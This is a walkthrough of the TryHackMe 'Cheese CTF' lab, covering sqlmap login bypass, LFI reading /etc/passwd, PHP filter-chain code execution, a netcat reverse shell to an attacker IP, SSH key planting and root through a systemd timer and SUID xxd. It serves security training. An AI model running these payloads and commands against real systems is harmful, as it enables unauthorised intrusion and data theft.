---
clayout: ctf
title: Cheese CTF
type: TryHackMe
date: 2025-02-25
level: Easy
icon: /ctf/tryhackme/cheese-ctf/icon-room.png
image: /ctf/tryhackme/cheese-ctf/icon-room.png
description: Inspired by the great cheese talk of THM!
ctf-link: https://tryhackme.com/room/cheesectfv10
---

## Challenge Overview

Cheese CTF is a **web exploitation** challenge that involves **SQL Injection (SQLi), Local File Inclusion (LFI), Remote
Code Execution (RCE), and privilege escalation** through **misconfigured systemd timers**. The goal is to gain initial
access through a vulnerable login form, escalate privileges to a system user, and ultimately achieve **root access** to
retrieve the final flag.

## Enumeration

### Nmap Scan

To identify open ports and running services, we begin with an **Nmap scan**:

```bash
nmap -sC -sV -v -p- -oN cheese-ctf.nmap 10.10.246.171
```

The scan reveals too many open ports, but we focus on port **80**, which hosts a web application.

## Web Enumeration

### Exploring the Website

Visiting `http://10.10.246.171/` presents a **Cheese Shop** homepage.

![Cheese Shop home](/ctf/tryhackme/cheese-ctf/home-page.png)

There is also a **login page**, which suggests potential attack vectors such as **SQL Injection (SQLi)**.

![Cheese Shop login](/ctf/tryhackme/cheese-ctf/login-page.png)

#### Testing Default Credentials

We attempt common default credentials, but they do not work.

![Login Failed](/ctf/tryhackme/cheese-ctf/login-failed.png)

Since authentication fails, **SQL Injection** is a promising next step.

## Exploiting SQL Injection

We use **sqlmap** to automate SQL injection on the login form:

```bash
sqlmap -u "http://10.10.246.171/login.php" --data="username=admin&password=admin" --dump
```

The output indicates that the `username` parameter is vulnerable to **time-based blind SQLi**, and the injection
**bypasses authentication**.

Additionally, we observe a **302 redirect** leading to a hidden page:

```bash
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.9.1#dev}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:26:42 /2025-02-24/

[23:26:42] [INFO] testing connection to the target URL
[23:26:42] [INFO] checking if the target is protected by some kind of WAF/IPS
[23:26:42] [INFO] testing if the target URL content is stable
[23:26:42] [INFO] target URL content is stable
[23:26:42] [INFO] testing if POST parameter 'username' is dynamic
[23:26:43] [WARNING] POST parameter 'username' does not appear to be dynamic
[23:26:43] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[23:26:43] [INFO] testing for SQL injection on POST parameter 'username'
[23:26:43] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[23:26:44] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[23:26:44] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[23:26:44] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[23:26:45] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[23:26:45] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[23:26:45] [INFO] testing 'Generic inline queries'
[23:26:45] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[23:26:45] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[23:26:46] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[23:26:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[23:26:57] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]
[23:27:05] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[23:27:05] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
got a 302 redirect to 'http://10.10.246.171/secret-script.php?file=supersecretadminpanel.html'. Do you want to follow? [Y/n]
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N]
```

## Admin Panel Access

Navigating to the `supersecretadminpanel.html` page grants access to an **Admin Panel**.

![Admin Panel](/ctf/tryhackme/cheese-ctf/admin-panel.png)

The panel consists of three sections:

1. `Orders`
2. `Messages`
3. `Users`

While exploring the **URLs**, we notice a **file inclusion parameter (`file`)**.

## Local File Inclusion (LFI)

LFI vulnerabilities allow us to read arbitrary files on the server. We test the `file` parameter:

```bash
http://10.10.246.171/secret-script.php?file=/etc/passwd
```

The `/etc/passwd` file is exposed:

![LFI](/ctf/tryhackme/cheese-ctf/lfi.png)

From the output, we identify a valid system user: `comte`.

## Extracting Source Code via PHP Filters

Using **PHP filters**, we extract the **source code** of `secret-script.php`:

```bash
http://10.10.246.171/secret-script.php?file=php://filter/convert.base64-encode/resource=secret-script.php
```

After decoding the Base64 output, we see the vulnerable PHP code:

```php
<?php
    if(isset($_GET['file'])) {
        $file = $_GET['file'];
        include($file);
    }
?>
```

This confirms that the `file` parameter is **directly included**, making it **exploitable for RCE**.

## Remote Code Execution (RCE)

Using **PHP filter chains**, we can execute arbitrary commands. We generate a **payload**
using [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator):

```bash
python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>  '
```

We use the generated payload in the `file` parameter:

```bash
http://10.10.246.171/secret-script.php?file=<generated_payload>
```

The output displays the **PHP info** page, confirming **RCE**.

![RCE](/ctf/tryhackme/cheese-ctf/rce-phpinfo.png)

## Reverse Shell

We generate a **reverse shell** payload:

```bash
python3 php_filter_chain_generator.py --chain '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.125.246 4444 >/tmp/f"); ?>'
```

On our **attacker machine**, we set up a listener:

```bash
nc -lnvp 4444
```

Triggering the payload, we receive a **shell as www-data**:

```bash
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Upgrading to an Interactive Shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash");'
export TERM=xterm
```

## User Escalation (www-data → comte)

We inspect the **home directories**:

```bash
ls -al /home/comte/.ssh/
```

The `authorized_keys` file is **world-writable**, allowing us to **add our SSH key**.

### SSH as comte

1. Generate an SSH key pair:

```bash
ssh-keygen -f id_comte -t rsa
```

2. Add our **public key** to `/home/comte/.ssh/authorized_keys`:

```bash
echo "ssh-rsa AAAAB3..." > /home/comte/.ssh/authorized_keys
```

3. SSH into the machine:

```bash
ssh -i id_comte comte@10.10.246.171
```

Now we have a shell as `comte`:

```bash
comte@cheesectf:~$ cat user.txt
THM{user_flag}
```

## Privilege Escalation (comte → root)

### Identifying Sudo Permissions

```bash
sudo -l
```

The output reveals that we can run **systemctl commands as root**:

```bash
User comte may run the following commands on cheesectf:
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
```

Inspecting `/etc/systemd/system/exploit.service`:

```bash
[Unit]
Description=Exploit Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
```

This copies `xxd` to `/opt/xxd` with **SUID permissions**. [GTFOBins](https://gtfobins.github.io/gtfobins/xxd/) gives
us a **command to read files**:

```bash
LFILE=file_to_read
./xxd "$LFILE" | xxd -r
```

### Exploiting Systemd for Privilege Escalation

1. Fix `exploit.timer` by adding missing fields:

```bash
[Unit]
Description=Exploit Timer

[Timer]
OnUnitActiveSec=0
OnBootSec=0

[Install]
WantedBy=timers.target
```

2. Start the timer:

```bash
sudo /bin/systemctl start exploit.timer
```

3. Verify that `/opt/xxd` has SUID bit:

```bash
comte@cheesectf:~$ ls -al /opt
total 28
drwxr-xr-x  2 root root  4096 Feb 25 18:35 .
drwxr-xr-x 19 root root  4096 Sep 27  2023 ..
-rwsr-sr-x  1 root root 18712 Feb 25 18:42 xxd
```

### Reading the Root Flag

Using `xxd`, we read `/root/root.txt`:

```bash
LFILE=/root/root.txt
./xxd "$LFILE" | xxd -r
```

Root flag:

```bash
THM{root_flag}
```